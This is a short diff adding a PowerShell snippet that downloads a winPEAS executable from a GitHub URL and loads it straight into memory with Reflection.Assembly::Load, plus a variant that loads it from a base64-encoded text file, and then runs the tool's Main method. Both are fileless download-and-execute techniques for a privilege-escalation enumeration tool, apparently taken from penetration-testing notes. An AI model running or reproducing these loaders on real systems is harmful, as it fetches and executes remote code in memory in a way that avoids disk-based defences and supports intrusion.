@@ -1,0 +1,6 @@
+$url = "https://github.com/luonnonlapsi/tmptmp/raw/main/w.exe"
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+$thecontent = Get-Content -Path D:\Users\x\w.txt
+$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
